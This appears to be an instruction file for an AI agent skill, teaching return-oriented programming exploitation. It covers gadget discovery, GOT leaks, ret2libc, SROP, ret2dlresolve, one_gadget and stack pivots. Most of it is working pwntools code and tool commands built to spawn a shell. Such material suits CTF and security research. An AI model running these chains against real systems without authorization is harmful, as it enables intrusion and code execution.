---
name: rop-chains
description: Build ROP chains to defeat NX/ASLR — gadget discovery with ROPgadget/ropper/r2, ret2plt GOT leaks, ret2libc, SROP sigreturn frames, ret2dlresolve without a libc leak, one_gadget, and stack pivots; use when a binary has NX and you control the return address or another indirect transfer.
compatibility: linux, python3, ROPgadget/ropper/one_gadget optional
metadata:
  author: Section9Labs
---

# rop-chains

NX kills shellcode on the stack; ROP reuses the binary's own code. This skill owns
chain construction. Delivery (tubes, offsets, packing) is the `pwntools` skill;
identifying the remote libc is `libc-identification`; stepping chains is
`gdb-debugging`.

Run `python3 scripts/find_gadgets.py ./target` first — it runs ROPgadget/ropper,
prints a categorized gadget table, and emits JSON of the key gadget addresses.

## 1. Gadget discovery

```bash
ROPgadget --binary ./target                       # all gadgets
ROPgadget --binary ./target --only "pop|ret"      # just pop/ret gadgets
ROPgadget --binary ./target --re 'pop rdi'        # regex filter
ROPgadget --binary ./target --ropchain            # auto-build execve chain (static bins)
ROPgadget --binary ./target --depth 12 --badbytes "0a|00"

ropper --file ./target --search "pop rdi"
ropper --file ./target --search "% ; ret"         # % wildcards any instruction
ropper --file ./target --chain execve             # auto execve chain
ropper --file ./target --badbytes 0a00 --search "pop r?i"
ropper --file ./target --type jop                 # rop | jop | sys | all

r2 -q -c '/R pop rdi' ./target                    # radare2 inline search
```

Full flag reference and output-reading guide: `references/gadget-tools.md`.

### The shopping list (amd64)

| gadget | purpose |
|---|---|
| `pop rdi ; ret` | arg1 (SysV: rdi,rsi,rdx,rcx,r8,r9) |
| `pop rsi ; ret` or `pop rsi ; pop r15 ; ret` | arg2 (junk-pad r15) |
| `pop rdx ; ret` / `pop rdx ; pop rbx ; ret` | arg3 (rare in small bins — libc has them) |
| `pop rax ; ret` | syscall number |
| `syscall ; ret` | re-usable syscall (bare `syscall` ends the chain) |
| `ret` | 16-byte stack alignment shim before `system`/`printf` |
| `leave ; ret` / `pop rsp ; ret` / `xchg eax, esp ; ret` | stack pivot |
| `mov qword [rdi], rsi ; ret` (any write-what-where) | write "/bin/sh" to .bss |

i386: args go on the stack — `func ; pop;pop;pop;ret ; arg1 ; arg2 ; arg3`;
syscalls via `int 0x80` with eax/ebx/ecx/edx.

If PIE is on, every gadget address is base-relative — leak a code pointer first,
set `elf.address`, and let pwntools' `ROP(elf)` resolve.

## 2. ret2plt — leaking libc through the GOT (no-PIE)

The binary's PLT and GOT are at fixed addresses. Call `puts@plt` with a GOT slot
as the argument; the GOT holds the resolved libc address of that function:

```python
rop = ROP(elf)
rop.raw(rop.find_gadget(["pop rdi", "ret"])[0])
rop.raw(elf.got["puts"])
rop.raw(elf.plt["puts"])
rop.raw(elf.symbols["main"])          # restart for stage 2
# equivalently: rop.puts(elf.got["puts"]); rop.call(elf.symbols["main"])
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
leak = u64(p.recvline(keepends=False).ljust(8, b"\x00"))
```

Any imported print primitive works: `puts`, `printf` (rdi = `%s` fmt, rsi = got),
`write(1, got, 8)` (needs rdx — leaks full 8 bytes, no NUL truncation).

## 3. ret2libc

```python
libc.address = leak - libc.symbols["puts"]        # must end in 000
rop2 = ROP(libc)
rop2.raw(rop2.find_gadget(["ret"])[0])            # ALIGNMENT: system() hits a
rop2.system(next(libc.search(b"/bin/sh")))        # movaps needing rsp%16==0
# or full control: rop2.execve(next(libc.search(b"/bin/sh")), 0, 0)
```

- Unknown remote libc → feed two leaked symbols' low 12 bits to the
  `libc-identification` skill, pull the matching `libc.so.6`, reload.
- Crash inside `system` with SIGSEGV at a `movaps xmm` → you forgot the `ret` pad.
- Alternative to system: `one_gadget` (below) needs only one address.

## 4. SROP — sigreturn when gadgets are scarce

If you have `pop rax ; ret` (or any way to set rax=15) and `syscall`, you can
forge an entire register file. `rt_sigreturn` pops a full sigcontext frame off
the stack — which you control:

```python
frame = SigreturnFrame()                  # pwntools; context must be set
frame.rax = constants.SYS_execve          # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget
rop = flat(pop_rax, 15, syscall_gadget, bytes(frame))   # rax=15 => rt_sigreturn
```

Variants: execve directly, or `mprotect(page, 0x1000, 7)` with
`frame.rsp = ret_to_shellcode` then jump to shellcode. If there is no
`pop rax`, set rax via a controlled `read()` return value (read exactly 15
bytes → rax=15). Worked example: `references/chains.md`.

## 5. ret2dlresolve — no leak, partial RELRO

Forges the dynamic-linker resolution structures so `_dl_runtime_resolve` resolves
an arbitrary symbol name you wrote into memory — no libc leak, no libc file needed.
Requires: no-PIE (or known base), Partial RELRO, and a `read`-like primitive.

```python
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop = ROP(elf)
rop.raw(rop.ret.address)                          # alignment as needed
rop.read(0, dlresolve.data_addr)                  # stage 1: read forged structs
rop.ret2dlresolve(dlresolve)                      # stage 2: plt0 + forged reloc idx
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
p.send(dlresolve.payload)                         # MUST arrive while read() runs
```

Order is everything: the chain's `read()` executes FIRST and blocks; the forged
payload you then `send()` lands at `dlresolve.data_addr`; only then does the
dl-resolve stub run. amd64 needs `pop rdi`/`pop rsi` gadgets for the read args
(csu gadgets work for rdx); i386 passes args on the stack so a bare overflow
suffices. Both forms worked in `references/chains.md`.

## 6. one_gadget

```bash
one_gadget ./libc.so.6
# 0xe3afe execve("/bin/sh", r15, r12)   constraints: [r15] == NULL || r15 == NULL ...
# 0xe3b01 execve("/bin/sh", r15, rdx)   constraints: ...
# 0xe3b04 execve("/bin/sh", rsi, rdx)   constraints: [rsi] == NULL || ...
```

Each candidate is a single address that execve's `/bin/sh` IF its register/stack
constraints hold at the moment you jump. Check constraints at your control point
with gdb (`gdb-debugging` skill): break at the return, inspect
rsi/rdx/r12/r15/[rsp+0x..]. If none hold naturally, satisfy them with one or two
pops first (`pop rdx ; ret` with 0) — still far shorter than a full chain. Overwrite
targets: return address, GOT slot (partial RELRO), `__malloc_hook`-style hooks
(glibc < 2.34).

## 7. Stack pivot — tiny overflows

When you can only overwrite saved RBP + RIP (16 bytes), stage the real chain in a
known-address region and move rsp there:

```python
stage = elf.bss(0x800)                     # writable, fixed on no-PIE
# step 1: get the chain there (an earlier read, a named input field, etc.)
# step 2: pivot — pick one:
#   leave ; ret   -> overwrite saved RBP = stage-8, RIP = leave;ret gadget
#                    (mov rsp, rbp ; pop rbp ; ret => rsp = stage)
#   pop rsp ; ret -> RIP = gadget, next word = stage
#   xchg eax, esp ; ret -> when eax already points at your data
payload = flat({OFFSET - 8: p64(stage - 8), OFFSET: p64(leave_ret)})
# pwntools equivalent:
rop.migrate(stage)
```

Common two-step: first pivot into a small chain that does
`read(0, big_area, 0x400)` + migrate again, then send the full ret2libc chain.

## 8. Workflow

1. checksec (via `pwntools` skill). NX+no-PIE+partial RELRO is the happy path.
2. `python3 scripts/find_gadgets.py ./target --json gadgets.json` — inventory.
3. Pick strategy: libc present → ret2plt leak + ret2libc; static binary →
   `--ropchain`/SROP execve; no leak possible → ret2dlresolve; one address of
   control → one_gadget; <24 bytes of overflow → pivot first.
4. Build with pwntools `ROP`, review `rop.dump()`, test under `gdb.debug`
   (`gdb-debugging`): break on the first gadget, `ni` through the chain.
5. Land it with the `pwntools` skill's two-stage skeleton; on success record
   assets/finding per `references/rupu.md`.

## References

- `references/gadget-tools.md` — ROPgadget, ropper, one_gadget: all flags, output
  formats, pitfalls.
- `references/chains.md` — complete worked chains (ret2plt/ret2libc, SROP,
  ret2dlresolve i386+amd64, pivot) against TEST-NET remotes.
- `references/rupu.md` — asset/finding/work-unit wiring.
- Siblings: `pwntools`, `libc-identification`, `gdb-debugging`,
  `format-string-exploitation`, umbrella `binary-analysis`.
